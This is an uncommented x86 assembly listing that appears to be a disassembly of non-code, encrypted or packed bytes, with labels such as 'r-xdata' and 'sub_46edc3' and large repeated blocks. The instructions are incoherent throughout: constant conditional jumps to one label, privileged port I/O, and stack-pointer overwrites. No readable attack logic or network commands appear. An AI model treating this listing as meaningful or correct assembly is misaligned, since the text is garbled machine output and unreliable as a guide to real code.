adc [ esp + edx ] dl
add bl [ ecx ]
jpo r-xdata
bound edi [ esi + 0x6702b151 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
outsb
outsd
stc
jmp r-xdata
mov esp 0x683360e7
adc [ esp ] dl
fucomi st3
jmp r-xdata
bound esi [ esi + 0x37ae6017 ]
jpo r-xdata
mov ah 0x2
int1
0x7b7bebeb 0x817b
out dx eax
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
or edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
pushad
sub ch cl
mov esp 0x52021160
add al [ esi + 0x39 ]
bound esp [ esi - 0x7edc9fe5 ]
lds ecx [ ebp - 0x4de6599e ]
lea esp [ edx - 0x5a ]
jpo r-xdata
sbb eax [ edx ]
aaa
mov bl 0x81
popfd
lea esp [ edx - 0x52 ]
adc al 0xb2
bound ebp [ esi - 0x1bd72fe9 ]
outsd
sub eax [ edx ]
lodsd [ esi ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x42 ]
push ecx
mov cl 0x2
loopne r-xdata
scasb [ edi ]
mov bh 0xbb
add al [ eax + 0x8 ]
adc al 0x14
jpo r-xdata
shr [ ebp - 0x4911b21 ] 0x1
jmp r-xdata
pop ss
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7c
pop ds
jmp r-xdata
mov ebp 0xbb02b9bc
outsd
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov eax 0x14379e14
jl r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
adc al 0x14
sbb esp [ eax + 0x23 ]
add ebp 0x19a6628d
mov dl 0x8d
bound esp [ esi + 0x3946021f ]
jpo r-xdata
sub ebx 0xdc03ebeb
jmp r-xdata
add eax [ ebp + 0x3 ]
adc al 0x14
jpo r-xdata
nop
[ edx - 0x1b185930 ]
jpo r-xdata
mov dl 0x62
scasb [ edi ]
pop ss
shr [ eax ] 0x1
in al 0x6f
inc ebp
add edx [ esp + edx ]
jpo r-xdata
jmp r-xdata
pushad
scasb [ edi ]
aaa
mov dh 0x17
jpo r-xdata
or ebx eax
adc al 0x2
jmp r-xdata
mov ch 0xf1
mov ebx 0x14e3ae60
adc al 0x14
jpo r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
jmp r-xdata
adc al 0x9e
aaa
adc al 0x7c
and eax [ ecx - 0x599d723b ]
sbb [ edx + 0x1fa6628d ] esi
outsb
das
pop ss
adc al 0x14
add bh [ eax ]
imul ebp ebx 0xffffffeb
jmp r-xdata
jpo r-xdata
shl [ esi + 0x7d69e4e7 ] 0x1
cli
jmp r-xdata
jpo r-xdata
iretd
push 0x60bce92a
adc [ edx ] eax
push edx
dec edi
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
add cl [ eax + 0x3c ]
add bh ah
mov cl 0x81
jpo r-xdata
adc [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
pop ds
jpo r-xdata
add ah dh
outsb
cmp esp esp
outsb
call 0xffffffffe932d4f0
sahf
jpo r-xdata
outsb
pop es
push ss
adc al 0x14
add esp [ eax ]
retn
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
outsd
outsb
sub esp esp
jpo r-xdata
add al ch
jpo r-xdata
mov [ ebp + 0x60fdae62 ] cl
jpo r-xdata
adc al 0xbb
pushad
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
in al 0x6f
jpo r-xdata
jpo r-xdata
loopne r-xdata
jpo r-xdata
call [ edx ]
in al 0x6f
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
bound ebp [ esi - 0x72d69f03 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ebx 0xe42b6ecf
jpo r-xdata
adc al 0x14
adc al 0x14
cld
cmp [ eax + 0x2d ] ah
add al [ edi + 0x7b141418 ]
out dx eax
jmp r-xdata
jpo r-xdata
clc
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc eax [ edx ]
jpo r-xdata
sub [ ebp - 0x4c0c519e ] ecx
add [ esi - 0xe519d73 ] 0x14362702
adc al 0x7b
jpo r-xdata
std
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x6a ]
push edi
pushad
adc eax 0x140b5902
adc al 0x7b
lea esp [ edx - 0x52 ]
sbb eax 0xae628db3
adc ebx eax
sub ecx [ ebp - 0x7cee519e ]
out dx eax
0x6e66ebeb 0x106f
xlat
in al 0x6e
jpo r-xdata
adc al 0x14
mov esp 0x106f6666
adc al 0x14
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
popfd
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
scasb [ edi ]
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
shl [ esi + 0x3e6fe4e7 ] cl
adc al 0x14
jpo r-xdata
jpo r-xdata
lds edx [ edx ]
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
sub eax 0x14188702
adc al 0x7b
add cl [ ebx ]
jpo r-xdata
adc [ esp ] dl
outsb
xor ebp 0x2bd8ebeb
add al cl
sbb dl [ esp + edx ]
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x14
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x6e
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
jpo r-xdata
bound ebp [ esi - 0x797e4c0d ]
lea esp [ edx - 0x52 ]
int1
add ah [ edi ]
adc al 0x14
jpo r-xdata
add cl [ ecx ]
out dx al
jmp r-xdata
add dh [ eax + 0x34 ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
add [ esp + edx ] edx
outsb
jpo r-xdata
add bh [ ebx + 0x7b141400 ]
jpo r-xdata
arpl bx bp
adc al 0x14
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
sahf
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
sbb [ esp + edx ] edx
pop es
inc edi
out dx eax
jmp r-xdata
cld
jmp sub_46edc3
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
adc al 0x14
pushad
sub al [ edx ]
salc
jpo r-xdata
jpo r-xdata
jmp r-xdata
push 0x7ee41413
sub ah [ eax + 0x1a ]
adc al 0x38
jmp r-xdata
jpo r-xdata
add dh [ ebp + 0x7bebebf1 ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
int3
jpo r-xdata
adc al 0x14
jpo r-xdata
push cs
jpo r-xdata
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
xor edi [ edx - 0x25fd547f ]
xor edx [ esp + edx ]
jpo r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
clc
call 0xffffffffd932da4d
sub ebp [ ebx + 0x7b7b7b28 ]
jpo r-xdata
pushfd
jpo r-xdata
jpo r-xdata
push 0x5ce4e903
jecxz r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
cld
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
jmp r-xdata
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
add ch ah
jpo r-xdata
aas
adc al 0x14
jpo r-xdata
add dl dh
jmp r-xdata
add bh [ eax - 0x10 ]
jmp sub_46edcb
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x52 ]
xor [ eax + 0x2a ] esp
lea esp [ edx - 0x52 ]
aaa
mov bl 0x81
lds esi [ ecx + eax * 4 - 0x519d7272 ]
xor eax 0xebee8302
jmp r-xdata
call 0xffffffff8d5b011f
bound ebp [ esi - 0x72d59fcf ]
bound ebp [ esi - 0x3a7e4cc9 ]
mov ah 0x81
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x207ae66
adc al 0x7b
adc al 0x9d
jpo r-xdata
jpo r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sti
jpo r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jpo r-xdata
jo r-xdata
jpo r-xdata
clc
jmp r-xdata
add edi eax
jpo r-xdata
outsb
out 0x3 eax
adc al 0x9e
sub_46eb87
push 0xae66bb2f
sub edi [ ebx + 0x7e02ea81 ]
pop es
adc al 0x14
jpo r-xdata
bound esp [ esi - 0x7edc9fe5 ]
lds ecx [ ebp - 0x4de6599e ]
lea esp [ edx - 0x5a ]
jpo r-xdata
mov ebp 0x7b14140b
jpo r-xdata
adc al 0x14
sbb esp [ eax + 0x23 ]
add ebp 0x19a6628d
mov dl 0x8d
bound esp [ esi + 0x3946021f ]
jpo r-xdata
outsb
jpo r-xdata
adc al 0x14
jpo r-xdata
add al [ esi + 0x39 ]
and eax [ ecx - 0x599d723b ]
sbb [ edx + 0x1fa6628d ] esi
outsb
das
pop ss
adc al 0x14
add bh [ eax ]
or al 0x14
adc al 0x7b
jpo r-xdata
adc al 0x7c
pop ds
jmp r-xdata
mov ebp 0xbb02b9bc
outsd
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov eax 0x14379e14
jl r-xdata
jpo r-xdata
cmp [ esp + edx ] edx
jpo r-xdata
or ebx eax
adc al 0x2
jmp r-xdata
mov ch 0xf1
mov ebx 0x14e3ae60
adc al 0x14
jpo r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
jmp r-xdata
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
add cl [ eax + 0x3c ]
add bh ah
mov cl 0x81
jpo r-xdata
adc [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
pop ds
or edx [ esp + edx ]
jpo r-xdata
pushad
sub ch cl
mov esp 0x52021160
iretd
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
outsd
outsb
sub esp esp
jpo r-xdata
add al ch
jpo r-xdata
mov [ ebp + 0x60fdae62 ] cl
jpo r-xdata
adc al 0xbb
pushad
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
in al 0x6f
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
call [ edx ]
in al 0x6f
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
bound ebp [ esi - 0x72d69f03 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ebx 0xe42b6ecf
jpo r-xdata
adc al 0x14
adc al 0x14
cld
cmp [ eax + 0x2d ] ah
add al [ edi + 0x7b141418 ]
out dx eax
jmp r-xdata
jpo r-xdata
mov ah 0x2
int1
0x7b7bebeb 0x817b
adc al 0x9e
aaa
adc al 0x7c
dec edi
jpo r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc eax [ edx ]
jpo r-xdata
sub [ ebp - 0x4c0c519e ] ecx
add [ esi - 0xe519d73 ] 0x14362702
adc al 0x7b
jpo r-xdata
std
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x6a ]
push edi
pushad
adc eax 0x140b5902
adc al 0x7b
lea esp [ edx - 0x52 ]
sbb eax 0xae628db3
adc ebx eax
sub ecx [ ebp - 0x7cee519e ]
out dx eax
0x6e66ebeb 0x106f
adc al 0x14
mov esp 0x106f6666
adc al 0x14
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
popfd
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
scasb [ edi ]
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
shl [ esi + 0x3e6fe4e7 ] cl
adc al 0x14
jpo r-xdata
jpo r-xdata
lds edx [ edx ]
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
sub eax 0x14188702
adc al 0x7b
adc [ esp ] dl
outsb
xor ebp 0x2bd8ebeb
add al cl
sbb dl [ esp + edx ]
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x14
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x6e
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
jpo r-xdata
bound ebp [ esi - 0x797e4c0d ]
lea esp [ edx - 0x52 ]
int1
add ah [ edi ]
adc al 0x14
jpo r-xdata
add cl [ ecx ]
out dx al
jmp r-xdata
add dh [ eax + 0x34 ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
add bh [ ebx + 0x7b141400 ]
jpo r-xdata
arpl bx bp
adc al 0x14
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
sahf
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
cld
jmp sub_46edc3
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
adc al 0x14
pushad
sub al [ edx ]
salc
jpo r-xdata
jpo r-xdata
jmp r-xdata
push 0x7ee41413
sub ah [ eax + 0x1a ]
adc al 0x38
jmp r-xdata
jpo r-xdata
add dh [ ebp + 0x7bebebf1 ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
int3
jpo r-xdata
adc al 0x14
jpo r-xdata
push cs
jpo r-xdata
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
xor edi [ edx - 0x25fd547f ]
xor edx [ esp + edx ]
jpo r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
clc
call 0xffffffffd932da4d
sub ebp [ ebx + 0x7b7b7b28 ]
jpo r-xdata
pushfd
jpo r-xdata
jpo r-xdata
push 0x5ce4e903
jecxz r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
cld
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
jmp r-xdata
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
add ch ah
jpo r-xdata
aas
adc al 0x14
jpo r-xdata
add dl dh
jmp r-xdata
add bh [ eax - 0x10 ]
jmp sub_46edcb
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x52 ]
xor [ eax + 0x2a ] esp
lea esp [ edx - 0x52 ]
aaa
mov bl 0x81
lds esi [ ecx + eax * 4 - 0x519d7272 ]
xor eax 0xebee8302
jmp r-xdata
call 0xffffffff8d5b011f
bound ebp [ esi - 0x72d59fcf ]
bound ebp [ esi - 0x3a7e4cc9 ]
mov ah 0x81
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x207ae66
adc al 0x7b
adc al 0x9d
jpo r-xdata
jpo r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sti
jpo r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jpo r-xdata
jo r-xdata
jpo r-xdata
clc
jmp r-xdata
add edi eax
jpo r-xdata
outsb
out 0x3 eax
adc al 0x9e
sub_46ebbc
in eax dx
jmp r-xdata
jpo r-xdata
jpo r-xdata
push 0x60bce92a
adc [ edx ] eax
push edx
iretd
mov ebp 0x7b14140b
jpo r-xdata
jpo r-xdata
outsb
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0x7c
pop ds
jmp r-xdata
mov ebp 0xbb02b9bc
outsd
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov eax 0x14379e14
jl r-xdata
or ebx eax
adc al 0x2
jmp r-xdata
mov ch 0xf1
mov ebx 0x14e3ae60
adc al 0x14
jpo r-xdata
or al 0x14
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
jmp r-xdata
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
add cl [ eax + 0x3c ]
add bh ah
mov cl 0x81
jpo r-xdata
adc [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
pop ds
add al [ esi + 0x39 ]
adc al 0x14
loop r-xdata
bound edx [ esi - 0x72ea9fcb ]
bound edx [ esi + 0x214d80b ]
outsd
outsb
sub esp esp
jpo r-xdata
add al ch
jpo r-xdata
mov [ ebp + 0x60fdae62 ] cl
jpo r-xdata
adc al 0xbb
pushad
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
in al 0x6f
jpo r-xdata
call [ edx ]
in al 0x6f
jpo r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
bound ebp [ esi - 0x72d69f03 ]
jpo r-xdata
adc al 0x14
jpo r-xdata
mov ebx 0xe42b6ecf
jpo r-xdata
adc al 0x14
adc al 0x14
cld
cmp [ eax + 0x2d ] ah
add al [ edi + 0x7b141418 ]
out dx eax
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
lea esp [ edx - 0x52 ]
daa
mov bl 0x81
test [ ecx + 0x628d9e81 ] dh
out 0xeb al
jmp r-xdata
mov dh 0xe7
in al 0x6f
adc al 0x14
adc al 0x7b
jpo r-xdata
jpo r-xdata
adc eax [ edx ]
jpo r-xdata
sub [ ebp - 0x4c0c519e ] ecx
add [ esi - 0xe519d73 ] 0x14362702
adc al 0x7b
jpo r-xdata
std
pushad
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
lea esp [ edx - 0x6a ]
push edi
pushad
adc eax 0x140b5902
adc al 0x7b
lea esp [ edx - 0x52 ]
sbb eax 0xae628db3
adc ebx eax
sub ecx [ ebp - 0x7cee519e ]
out dx eax
0x6e66ebeb 0x106f
adc al 0x14
mov esp 0x106f6666
adc al 0x14
jpo r-xdata
shl [ esi - 0x52 ] cl
pop es
add bh [ ecx + 0x7bebebfd ]
jpo r-xdata
popfd
jpo r-xdata
adc al 0x9e
or eax [ edx ]
int 0xe
scasb [ edi ]
adc al 0x9e
lar ebp [ esi ]
adc al 0x14
shl [ esi + 0x3e6fe4e7 ] cl
adc al 0x14
jpo r-xdata
jpo r-xdata
lds edx [ edx ]
jpo r-xdata
jpo r-xdata
das
jpo r-xdata
jpo r-xdata
jpo r-xdata
pushad
sub eax 0x14188702
adc al 0x7b
adc [ esp ] dl
outsb
xor ebp 0x2bd8ebeb
add al cl
sbb dl [ esp + edx ]
jpo r-xdata
xor al 0x14
adc al 0x81
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
mov al 0x2
retn
adc al 0x14
sub eax [ edx ]
add dl dh
jmp r-xdata
adc al 0x6e
jpo r-xdata
scasb [ edi ]
aas
jpo r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x14
jpo r-xdata
bound ebp [ esi - 0x797e4c0d ]
lea esp [ edx - 0x52 ]
int1
add ah [ edi ]
adc al 0x14
jpo r-xdata
add cl [ ecx ]
out dx al
jmp r-xdata
add dh [ eax + 0x34 ]
jpo r-xdata
and ch [ eax ]
jpo r-xdata
jpo r-xdata
add bh [ ebx + 0x7b141400 ]
jpo r-xdata
arpl bx bp
adc al 0x14
stosd [ edi ]
add bl [ ebp + 0xc ]
adc al 0x14
pushad
scasb [ edi ]
pop ss
sahf
xchg esp eax
adc al 0x14
add cl ah
or eax 0x7b7b1414
mov esp 0xe42b6ebf
jmp r-xdata
adc al 0xbc
mov edi 0x6fe42b6e
jpo r-xdata
jpo r-xdata
adc al 0x14
jpo r-xdata
jpo r-xdata
xor al 0x14
jpo r-xdata
jpo r-xdata
jpo r-xdata
outsd
cld
jmp sub_46edc3
jpo r-xdata
add [ esp + edx ] dl
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov esp [ eax + 0x33 ]
outsb
xor ah ah
outsd
dec esi
bound ebx [ esi + 0x3b ]
push ss
adc al 0x14
outsb
sub eax [ edx ]
push 0x9
adc al 0x14
jpo r-xdata
outsd
outsb
sub esp esp
bound ebp [ esi + 0x33ec0213 ]
fwait
pop ss
add ah [ eax + 0x7b14140f ]
adc al 0x14
pushad
sub al [ edx ]
salc
jpo r-xdata
jpo r-xdata
jmp r-xdata
push 0x7ee41413
sub ah [ eax + 0x1a ]
adc al 0x38
jmp r-xdata
jpo r-xdata
add dh [ ebp + 0x7bebebf1 ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
bound ebp [ ebp + 0xcc103ef ]
adc al 0x14
jpo r-xdata
int3
jpo r-xdata
adc al 0x14
jpo r-xdata
push cs
jpo r-xdata
call 0xffffffffaea9ea4c
adc esp [ eax - 0x52 ]
pop ss
shr [ esi + 0x12c50213 ] 0x1
xor edi [ edx - 0x25fd547f ]
xor edx [ esp + edx ]
jpo r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
clc
call 0xffffffffd932da4d
sub ebp [ ebx + 0x7b7b7b28 ]
jpo r-xdata
pushfd
jpo r-xdata
jpo r-xdata
push 0x5ce4e903
jecxz r-xdata
mov [ 0xffffffffefad62bc ] al
add eax ecx
or al 0x14
adc al 0x83
mov ebp [ esp + ecx * 2 - 0x23 ]
mov esp 0xeb5b6d62
jmp r-xdata
out dx eax
jpo r-xdata
adc al 0x14
jpo r-xdata
adc al 0xe8
sub edi [ ebx - 0x140363fe ]
jmp r-xdata
cld
or dh [ edi ]
adc al 0x14
call 0xffffffff9c49a980
jmp r-xdata
mov ah 0xb5
mov al 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
add ch ah
jpo r-xdata
aas
adc al 0x14
jpo r-xdata
add dl dh
jmp r-xdata
add bh [ eax - 0x10 ]
jmp sub_46edcb
jpo r-xdata
adc al 0x14
lea esp [ edx - 0x52 ]
xor [ eax + 0x2a ] esp
lea esp [ edx - 0x52 ]
aaa
mov bl 0x81
lds esi [ ecx + eax * 4 - 0x519d7272 ]
xor eax 0xebee8302
jmp r-xdata
call 0xffffffff8d5b011f
bound ebp [ esi - 0x72d59fcf ]
bound ebp [ esi - 0x3a7e4cc9 ]
mov ah 0x81
or [ ebx - 0x4322b394 ] 0x62
insd
pop ebx
jmp r-xdata
mov esp 0x3efad62
ror [ esp + edx ] 0x14
pop esp
lodsd [ esi ]
in eax dx
add dl bl
pop ds
adc al 0x14
jpo r-xdata
mov eax 0x1414c802
adc al 0x7b
add cl [ ebx + 0x19 ]
adc al 0x14
in al 0x6e
mov edx 0x60141417
fwait
in al 0x6e
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
xor edx [ esp + edx ]
jpo r-xdata
jpo r-xdata
and eax 0xebf51702
jmp r-xdata
bound ebp [ esi - 0x7b7e4cd9 ]
mov cl 0x81
sahf
lea esp [ edx - 0x52 ]
xor al 0x14
adc al 0x14
sahf
pop ss
mov esp 0xeb637d14
scasb [ edi ]
cmp ebx [ ecx + 0x3cbcb9d ]
sub dh dh
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x207ae66
adc al 0x7b
adc al 0x9d
jpo r-xdata
jpo r-xdata
xlat
call 0x3e64f209
adc al 0x14
jpo r-xdata
jecxz r-xdata
jpo r-xdata
sti
jpo r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jpo r-xdata
jpo r-xdata
jo r-xdata
jpo r-xdata
clc
jmp r-xdata
add edi eax
jpo r-xdata
outsb
out 0x3 eax
adc al 0x9e
sub_46ec05
adc al 0x14
stosd [ edi ]
mov ah 0x22
sub [ ebx + 0x7b ] bh
jpo r-xdata
sahf
mov al 0x8d
bound esi [ esi - 0x4f7d7ee7 ]
lea esp [ edx - 0x4a ]
pop ds
jpo r-xdata
jmp r-xdata
jpo r-xdata
pushad
xor al 0x8d
bound esi [ esi - 0x72cc9fe3 ]
bound esi [ esi + 0xbbd0213 ]
lea esp [ edx - 0x4a ]
sbb [ ecx + 0x628db082 ] eax
mov dh 0x1f
lea esp [ edx - 0x5a ]
sbb esp [ eax + 0x23 ]
add ebp 0x19a6628d
mov dl 0x8d
bound esp [ esi + 0x3946021f ]
or al 0x14
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
mov ebp 0x7b14140b
jpo r-xdata
jpo r-xdata
mov cl 0x81
jpo r-xdata
adc al 0x7c
pop ds
jmp r-xdata
mov ebp 0xbb02b9bc
adc [ esp + edx ] dl
jpo r-xdata
outsd
outsb
jpo r-xdata
adc al 0x14
jpo r-xdata
add al ch
jpo r-xdata
mov [ ebp + 0x60fdae62 ] cl
jpo r-xdata
or ebx eax
adc al 0x2
jmp r-xdata
mov ch 0xf1
adc al 0xbb
pushad
scasb [ edi ]
jecxz r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov eax 0x14379e14
jl r-xdata
bound ebp [ esi - 0xae8fddb ]
jmp r-xdata
jpo r-xdata
adc dl [ esp + edx ]
jpo r-xdata
bound ebp [ esi - 0x72d69f03 ]
jpo r-xdata
adc al 0x14
adc al 0x7c
pop ss
jmp r-xdata
add cl [ eax + 0x3c ]
adc al 0x14
jpo r-xdata
mov ebx 0xe42b6ecf
adc al 0x14
jpo r-xdata
cld
mov ebx 0x14e3ae60
adc al 0x14
